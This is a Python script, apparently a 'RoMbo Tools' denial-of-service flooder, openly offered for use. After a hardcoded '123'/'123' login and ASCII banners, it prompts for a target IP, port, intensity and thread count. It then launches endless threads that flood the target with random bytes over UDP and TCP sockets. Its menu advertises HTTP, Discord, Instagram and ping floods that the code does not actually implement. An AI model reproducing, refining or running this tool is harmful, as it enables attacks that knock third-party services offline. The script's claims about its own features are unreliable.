# -*- coding: utf-8 -*-
# AUTHOR: RoMbo Tools

import random
import socket
import threading
import os
import sys
import time
from termcolor import colored
import getpass

# Login System
class LoginSystem:
    def __init__(self):
        self.system_name = colored("""
§§§§§§¶¶¶¶¶¶§§§§§§§§§§§¶§¶§¶¶¶¶¶¶¶§§§¶§§
§§§¶§§111111§§1§¶§§§§§§¶§11§§111111§1¶§§
§§§¶¶§§11111§§1§¶§§§§§¶¶1§§§§11111§§§¶§§
§§§§¶¶§§1111§§1§¶§§§§§¶¶1§§¶11111§§§¶§§§
§§§§§¶¶§§111§§§1¶§§§§§¶§1§§§1111§§§¶§§§§
§§§§§§¶§1§§11¶§§¶¶§§§§¶§1§§§11§§§¶¶§§§§§          𝙎𝙝𝙤𝙬𝙍𝙤𝙈𝙗𝙤 15𝙭3
§§§§§§§¶¶1§§1§§1¶¶§§§§¶§11§11§§§¶¶§§§§§§         1 . 𝙐𝘿𝙋 𝙎𝙊𝙉𝙉..
§§§§§§§§¶¶1§§¶§1¶¶§§¶¶¶§1§§§§§§¶¶§§§§§§§         2  𝙃𝙏𝙏𝙋 𝙎𝙊𝙉𝙉..
§§§§§§§§§¶¶1§§§1¶¶¶¶¶§¶¶¶§§§1§¶§§§§§§§§§         3  𝘿𝙞𝙨𝙘𝙤𝙧𝙙 𝙨𝙤𝙣𝙣...
§§§§§§§§§§¶¶§§§1¶¶§¶§¶¶¶§¶§§§¶§§§§§§§§§§        4  .𝙃𝙀𝙓 𝙎𝙊𝙉𝙉..
§§§§§§§§§§§¶¶§§1§§11§¶§§¶§§§¶¶§§§§§§§§§§       5  .𝙞𝙣𝙨𝙩𝙜𝙧𝙖𝙢 𝙎𝙊𝙉𝙉..
§§§§§§§§§§¶§§§§§§§§§§1§§§§§§§§¶§§§§§§§§§     6  𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙄𝙉𝙂 𝙊𝙉𝙉.
§§§§§§§§§¶¶1§§§§§§§§§§§§§§§§§1§¶§§§§§§§§
§§§§§§§§§¶§§§1§§§§§§§§§§§§§11§§¶§§§§§§§§
§§§§§§§§§¶§§111§§§§§§§§§§§111§§¶¶§§§§§§§
§§§§§§§§¶§§§1111§§§§§§§§§11111§§¶§§§§§§§      𝙞𝙣𝙨𝙩𝙜𝙧𝙖𝙢:_𝙧𝙤𝙢𝙗𝙤𝙨𝙩𝙮𝙡𝙚
§§§§§§§¶§1§§1111§§§§§§§§§11111§1§¶§§§§§§
§§§§§§¶¶1§§§11111§§§§§§§11111§§§1¶¶§§§§§
§§§§¶¶§1§§§§11111§§§§§§§11111§§§§1¶¶§§§§
¶¶¶§¶¶§§§§§¶11§¶1§§§§§§§1¶¶11¶§§§§§¶¶¶¶¶
¶§§111111§§§¶1¶¶§§§§§§§§§¶¶1§§§§1111§§§§
1111111§111111§¶§§§§§§§§§¶§1111111111111
§§§§§§§1§§§§§1111§§§§§§§11111111§1§1§§§1      
111111§§§¶¶¶¶¶¶¶¶§1§§§11¶¶¶¶¶¶¶¶§§§§1§11
11§§§§§§§1§¶¶¶¶¶¶111¶§11¶¶¶¶¶¶¶111111111
§1111111111§¶¶§¶¶111§111§¶§§¶¶1111111111
¶§1111111111§¶¶¶¶111§111¶¶¶¶¶1111111111§
¶¶¶§111111111§¶¶¶§111111¶¶¶¶111111111§¶¶
§§¶¶¶§11111111§¶¶¶§§11§¶¶¶¶§11111111¶¶¶§
§§§§¶¶¶§1111111§¶¶¶¶¶¶¶¶§¶§111111§¶¶¶§§§
§§§§§§¶¶¶¶§§1111§¶§§§§§§§11111§§¶¶¶§§§§§
§§§§§§§§§¶¶¶¶¶§§11§§§§§§1§§§¶¶¶¶§§§§§§§§
§§§§§§§§§§§§§§¶§§§111111¶¶§¶¶§§§§§§§§§§§
        TOOLS BY RoMbo
        """, 'blue', attrs=['bold'])

    def show_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(colored("=" * 60, 'blue'))
        print(self.system_name)
        print(colored("=" * 60, 'blue'))
        print(colored("System - For Discord https://discord.gg/rRzMfT6j", 'blue'))
        print(colored("=" * 60, 'blue'))

    def login(self):
        self.show_banner()
        print(colored("\nPlease log in:", 'blue'))

        username = input(colored("Username: ", 'blue'))
        password = getpass.getpass(colored("Password: ", 'blue'))

        if username == "123" and password == "123":
            print(colored("\nLogin successful!", 'green'))
            return True
        else:
            print(colored("\nIncorrect credentials!", 'red'))
            return False

# Main Program Execution
if __name__ == "__main__":
    system = LoginSystem()
    if system.login():

        os.system("clear")
        os.system("xdg-open https://discord.gg/8gmRVnRRwV")
        print(colored("Welcome to RoMbo World", 'blue'))
        time.sleep(2)
        print(colored("Loading.......", 'blue'))
        os.system("clear")

        print(colored("""  §§§§§§¶¶¶¶¶¶§§§§§§§§§§§¶§¶§¶¶¶¶¶¶¶§§§¶§§
§§§¶§§111111§§1§¶§§§§§§¶§11§§111111§1¶§§
§§§¶¶§§11111§§1§¶§§§§§¶¶1§§§§11111§§§¶§§
§§§§¶¶§§1111§§1§¶§§§§§¶¶1§§¶11111§§§¶§§§
§§§§§¶¶§§111§§§1¶§§§§§¶§1§§§1111§§§¶§§§§
§§§§§§¶§1§§11¶§§¶¶§§§§¶§1§§§11§§§¶¶§§§§§          𝙎𝙝𝙤𝙬𝙍𝙤𝙈𝙗𝙤 15𝙭3
§§§§§§§¶¶1§§1§§1¶¶§§§§¶§11§11§§§¶¶§§§§§§         1 . 𝙐𝘿𝙋 𝙎𝙊𝙉𝙉.
§§§§§§§§¶¶1§§¶§1¶¶§§¶¶¶§1§§§§§§¶¶§§§§§§§       2  𝙃𝙏𝙏𝙋 𝙎𝙊𝙉𝙉..
§§§§§§§§§¶¶1§§§1¶¶¶¶¶§¶¶¶§§§1§¶§§§§§§§§§         3  𝘿𝙞𝙨𝙘𝙤𝙧𝙙 𝙨𝙤𝙣𝙣...
§§§§§§§§§§¶¶§§§1¶¶§¶§¶¶¶§¶§§§¶§§§§§§§§§§        4  .𝙃𝙀𝙓 𝙎𝙊𝙉𝙉..
§§§§§§§§§§§¶¶§§1§§11§¶§§¶§§§¶¶§§§§§§§§§§       5  .𝙞𝙣𝙨𝙩𝙜𝙧𝙖𝙢 𝙎𝙊𝙉𝙉..
§§§§§§§§§§¶§§§§§§§§§§1§§§§§§§§¶§§§§§§§§§     6  𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙄𝙉𝙂 𝙊𝙉𝙉.
§§§§§§§§§¶¶1§§§§§§§§§§§§§§§§§1§¶§§§§§§§§
§§§§§§§§§¶§§§1§§§§§§§§§§§§§11§§¶§§§§§§§§
§§§§§§§§§¶§§111§§§§§§§§§§§111§§¶¶§§§§§§§
§§§§§§§§¶§§§1111§§§§§§§§§11111§§¶§§§§§§§      𝙞𝙣𝙨𝙩𝙜𝙧𝙖𝙢:_𝙧𝙤𝙢𝙗𝙤𝙨𝙩𝙮𝙡𝙚
§§§§§§§¶§1§§1111§§§§§§§§§11111§1§¶§§§§§§
§§§§§§¶¶1§§§11111§§§§§§§11111§§§1¶¶§§§§§
§§§§¶¶§1§§§§11111§§§§§§§11111§§§§1¶¶§§§§
¶¶¶§¶¶§§§§§¶11§¶1§§§§§§§1¶¶11¶§§§§§¶¶¶¶¶
¶§§111111§§§¶1¶¶§§§§§§§§§¶¶1§§§§1111§§§§
1111111§111111§¶§§§§§§§§§¶§1111111111111
§§§§§§§1§§§§§1111§§§§§§§11111111§1§1§§§1      
111111§§§¶¶¶¶¶¶¶¶§1§§§11¶¶¶¶¶¶¶¶§§§§1§11
11§§§§§§§1§¶¶¶¶¶¶111¶§11¶¶¶¶¶¶¶111111111
§1111111111§¶¶§¶¶111§111§¶§§¶¶1111111111
¶§1111111111§¶¶¶¶111§111¶¶¶¶¶1111111111§
¶¶¶§111111111§¶¶¶§111111¶¶¶¶111111111§¶¶
§§¶¶¶§11111111§¶¶¶§§11§¶¶¶¶§11111111¶¶¶§
§§§§¶¶¶§1111111§¶¶¶¶¶¶¶¶§¶§111111§¶¶¶§§§
§§§§§§¶¶¶¶§§1111§¶§§§§§§§11111§§¶¶¶§§§§§
§§§§§§§§§¶¶¶¶¶§§11§§§§§§1§§§¶¶¶¶§§§§§§§§
§§§§§§§§§§§§§§¶§§§1111
        TOOLS BY RoMbo
        """, 'blue'))

        ip = str(input(colored("Target IP: ", 'blue')))
        port = int(input(colored("Target Port: ", 'blue')))
        choice = str(input(colored("Use mixed mode? (y/n): ", 'blue')))
        times = int(input(colored("Time (intensity): ", 'blue')))
        threads = int(input(colored("Threads: ", 'blue')))

        def run():
            data = random._urandom(1024)
            i = random.choice(("[*]", "[!]", "[#]"))
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    addr = (str(ip), int(port))
                    for x in range(times):
                        s.sendto(data, addr)
                    print(colored(i + " Attack Sent!!!", 'blue'))
                except:
                    print(colored("[!] Error!!!", 'red'))

        def run2():
            data = random._urandom(999)
            i = random.choice(("[*]", "[!]", "[#]"))
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))
                    s.send(data)
                    for x in range(times):
                        s.send(data)
                    print(colored(i + " Attack Sent!!!", 'blue'))
                except:
                    s.close()
                    print(colored("[*] Error!!!", 'red'))

        def run3():
            data = random._urandom(818)
            i = random.choice(("[*]", "[!]", "[#]"))
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))
                    s.send(data)
                    for x in range(times):
                        s.send(data)
                    print(colored(i + " Attack Sent!!!", 'blue'))
                except:
                    s.close()
                    print(colored("[*] Error!!!", 'red'))

        def run4():
            data = random._urandom(16)
            i = random.choice(("[*]", "[!]", "[#]"))
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))
                    s.send(data)
                    for x in range(times):
                        s.send(data)
                    print(colored(i + " Attack Sent!!!", 'blue'))
                except:
                    s.close()
                    print(colored("[*] Error!!!", 'red'))

        for y in range(threads):
            if choice == 'y':
                threading.Thread(target=run).start()
                threading.Thread(target=run2).start()
                threading.Thread(target=run3).start()
            else:
                threading.Thread(target=run4).start()
    else:
        print(colored("Access Denied. Program Terminated.", 'red'))